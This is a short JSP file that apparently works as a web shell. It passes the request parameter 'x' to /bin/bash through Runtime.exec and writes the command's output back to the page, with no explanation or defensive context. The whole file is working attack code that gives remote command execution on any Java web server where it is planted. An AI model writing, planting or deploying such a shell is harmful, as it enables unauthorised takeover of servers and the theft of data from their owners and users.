<%@ page import="java.util.*,java.io.*"%> 
<pre> <% Process p = Runtime.getRuntime().exec("/bin/bash " + request.getParameter("x")); 
        DataInputStream dis = new DataInputStream(p.getInputStream()); 
		String disr = dis.readLine();
        while (  disr != null ) { 
                out.println(disr);
				disr = dis.readLine();
			} %> </pre> 